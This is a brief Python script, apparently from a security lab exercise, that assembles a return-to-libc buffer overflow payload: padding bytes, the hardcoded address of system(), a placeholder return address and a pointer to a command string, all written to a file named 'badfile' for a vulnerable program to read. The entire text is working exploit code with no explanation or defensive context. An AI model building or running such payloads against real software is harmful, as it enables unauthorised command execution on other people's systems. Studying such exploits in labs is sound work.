import struct

system = 0xb7e3fb40
str_addr = 0x804a02c

atk_vector = "A" * 18
atk_vector += struct.pack("I", system)
atk_vector += "A"*4 #ret of system()
atk_vector += struct.pack("I", str_addr) 


f = open("badfile", "w+")
f.write(atk_vector)
f.close()
